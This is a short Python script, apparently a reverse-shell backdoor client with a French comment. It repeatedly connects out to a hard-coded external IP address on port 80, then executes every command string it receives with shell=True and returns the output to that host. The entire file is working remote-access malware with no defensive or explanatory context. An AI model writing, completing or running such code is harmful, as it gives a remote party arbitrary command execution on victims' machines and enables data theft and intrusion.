import socket
import os
import sys
import subprocess
import base64
from time import sleep
import threading

host_name = os.getlogin()

HOST = socket._LOCALHOST  # non-local => changer socket._LOCALHOST en votre ip 
PORT = 80

filename = "data_socket1.txt"

server = ""

def try_connect():
    global server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        sleep(1)
        print('try')
        try:
            server.connect(("94.224.72.101", PORT)) 
            break
        except Exception as e:
            pass

def recv_data():
    global server
    while True:
        sleep(1)
        try:
            data = server.recv(1024).decode("utf-8")

            if len(data) > 0:
                try:
                    proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                    out, err = proc.communicate()
                    if len(out.decode("ISO-8859-1")) > 0:
                        server.send(out)
                    elif proc.returncode == 1:
                        server.send("Error".encode("utf-8"))
                    else:
                        server.send("Success".encode("utf-8"))
                except Exception as e:
                    print("error", e)
                    server.send(f"Client Error : {e}")
                    try_connect()
        except:
            try_connect()





try_connect()
recv_data()